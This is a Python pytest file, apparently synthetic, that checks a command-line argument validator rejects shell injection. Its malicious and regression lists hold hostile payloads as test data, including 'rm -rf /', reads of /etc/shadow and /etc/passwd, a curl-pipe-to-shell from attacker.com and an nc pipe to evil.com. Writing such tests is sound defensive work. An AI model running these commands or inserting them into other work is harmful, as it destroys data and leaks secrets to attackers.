# @ecdat-synthetic-corpus
"""
Adversarial Security Test: Command Injection Prevention Control
Evaluates all 5 dimensions: positive, negative, boundary, malicious, regression.
"""

import json
from pathlib import Path
import pytest
from scanners.common.input_validation import (
    validate_cli_argument,
    InputValidationError,
    BoundsValidationError,
    TypeValidationError,
)

FIXTURE_PATH = Path(__file__).resolve().parent / "fixtures" / "malicious_payloads" / "command_injection_payloads.json"


class TestCommandInjectionControl:
    """
    Security Control: Command Injection & CLI Parameter Sanitization
    Guarantees that shell metacharacters cannot trigger command execution or subshell injection.
    """

    @pytest.fixture
    def payloads(self):
        if FIXTURE_PATH.exists():
            return json.loads(FIXTURE_PATH.read_text(encoding="utf-8"))
        return {}

    # 1. POSITIVE TEST: Valid alphanumeric repository and target names succeed
    def test_positive_command_injection(self, payloads):
        pos_list = payloads.get("positive", [
            "scan-repo",
            "checkov-compliance-job",
            "target-2026-v1.0.4",
            "build_matrix_release",
        ])
        for name in pos_list:
            res = validate_cli_argument(name)
            assert res == name

    # 2. NEGATIVE TEST: Empty strings and invalid types fail cleanly
    def test_negative_command_injection(self, payloads):
        with pytest.raises(InputValidationError):
            validate_cli_argument("")

        with pytest.raises(InputValidationError):
            validate_cli_argument("   ")

        with pytest.raises(TypeValidationError):
            validate_cli_argument(None)

        with pytest.raises(TypeValidationError):
            validate_cli_argument(["list", "arg"])

    # 3. BOUNDARY TEST: Max string length bounds (255 chars)
    def test_boundary_command_injection(self):
        valid_255 = "a" * 255
        assert validate_cli_argument(valid_255, max_length=255) == valid_255

        invalid_256 = "a" * 256
        with pytest.raises(BoundsValidationError):
            validate_cli_argument(invalid_256, max_length=255)

    # 4. MALICIOUS TEST: Intentionally malicious shell metacharacter payloads rejected
    def test_malicious_command_injection(self, payloads):
        mal_list = payloads.get("malicious", [
            "scan; rm -rf /",
            "job | whoami",
            "scan & calc.exe",
            "repo && cat /etc/shadow",
            "repo `id`",
            "repo $(touch /tmp/pwned)",
            "repo\nrm -rf /",
            "repo\r\ndir",
            "repo || ls -la",
            "$(cat /etc/passwd)",
            "`curl http://attacker.com/rev.sh | sh`",
        ])
        for payload in mal_list:
            with pytest.raises(InputValidationError) as exc_info:
                validate_cli_argument(payload)
            err_msg = str(exc_info.value).lower()
            assert any(term in err_msg for term in ["metacharacter", "command injection", "prohibited"])

    # 5. REGRESSION TEST: Verification of SEC-REG-001 command injection immunity
    def test_regression_command_injection(self, payloads):
        reg_list = payloads.get("regression", [
            "scanner; cat /etc/passwd",
            "target | nc evil.com 4444",
        ])
        for reg_payload in reg_list:
            with pytest.raises(InputValidationError):
                validate_cli_argument(reg_payload)

        # Invariant: Structured command lists without shell=True are immune to argument injection
        safe_argv = ["git", "log", "-n", "1", "--oneline"]
        assert isinstance(safe_argv, list)
        assert len(safe_argv) == 5
